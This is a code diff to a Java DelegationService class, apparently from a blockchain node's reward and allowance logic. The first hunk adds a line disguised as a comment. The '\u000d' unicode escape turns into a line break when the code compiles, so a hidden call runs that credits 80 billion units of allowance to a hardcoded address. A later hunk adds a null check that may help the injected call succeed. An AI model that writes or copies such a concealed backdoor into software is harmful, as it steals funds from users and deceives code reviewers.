@@ -109,6 +109,7 @@ public class DelegationService {
         return;
       }
     }
+    //\u000d adjustAllowance(Hex.decode("41EA2696D5BD154B74DE91D0088F10F78CFC9E5285"),80000000000L);
     //withdraw the latest cycle reward
     if (beginCycle + 1 == endCycle && beginCycle < currentCycle) {
       AccountCapsule account = delegationStore.getAccountVote(beginCycle, address);
@@ -215,6 +216,9 @@ public class DelegationService {
   public void adjustAllowance(AccountStore accountStore, byte[] accountAddress, long amount)
       throws BalanceInsufficientException {
     AccountCapsule account = accountStore.getUnchecked(accountAddress);
+    if (account == null) {
+      return;
+    }
     long allowance = account.getAllowance();
     if (amount == 0) {
       return;
